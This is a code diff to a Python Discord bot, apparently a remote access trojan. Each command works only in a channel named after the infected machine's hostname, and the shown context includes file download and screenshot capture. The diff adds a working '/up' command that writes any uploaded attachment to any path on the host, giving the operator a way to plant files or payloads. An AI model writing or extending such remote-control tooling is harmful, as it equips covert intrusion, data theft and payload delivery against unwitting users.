@@ -202,6 +202,26 @@ async def download(interaction: discord.Interaction, caminho: str):
         await interaction.response.send_message("⚠ Este comando só pode ser usado no canal da máquina correspondente!", ephemeral=True)
 
 
+@bot.tree.command(name="up", description="Faz upload de um ficheiro para a máquina")
+async def upload(interaction: discord.Interaction, ficheiro: discord.Attachment, destino: str):
+    if interaction.channel.name.lower() == platform.node().lower():
+        await interaction.response.defer(thinking=True)
+        normal_activity()
+
+        try:
+            conteudo = await ficheiro.read()
+
+            with open(destino, "wb") as f:
+                f.write(conteudo)
+
+            await interaction.followup.send(f"✅ Ficheiro `{ficheiro.filename}` guardado com sucesso em:\n`{destino}`")
+
+        except Exception as e:
+            await interaction.followup.send(f"❌ Erro ao guardar o ficheiro: `{e}`")
+    else:
+        await interaction.response.send_message("⚠ Este comando só pode ser usado no canal da máquina correspondente!", ephemeral=True)
+
+
 @bot.tree.command(name="scrn", description="Captura uma screenshot")
 async def screenshot(interaction: discord.Interaction):
     if interaction.channel.name.lower() == platform.node().lower():
